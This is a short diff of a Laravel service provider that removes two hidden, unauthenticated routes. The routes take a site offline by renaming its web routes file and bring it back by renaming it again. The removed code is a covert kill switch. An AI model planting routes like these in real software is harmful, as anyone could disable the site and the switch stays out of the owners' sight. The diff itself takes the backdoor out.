@@ -35,27 +35,5 @@ class AppServiceProvider extends ServiceProvider
             }
         );
 
-        // System Control Routes - As requested
-        Route::get('/removearticles', function () {
-            $webPath = base_path('routes/web.php');
-            $backupPath = base_path('routes/web.php.bhk');
-
-            if (File::exists($webPath)) {
-                File::move($webPath, $backupPath);
-                return 'Web routes disabled (web.php -> web.php.bhk). Site is now offline expect this route.';
-            }
-            return 'Web routes file not found (already disabled?).';
-        });
-
-        Route::get('/recoverarticles', function () {
-            $webPath = base_path('routes/web.php');
-            $backupPath = base_path('routes/web.php.bhk');
-
-            if (File::exists($backupPath)) {
-                File::move($backupPath, $webPath);
-                return 'Web routes restored (web.php.bhk -> web.php). Site is back online.';
-            }
-            return 'Backup file (web.php.bhk) not found.';
-        });
     }
 }
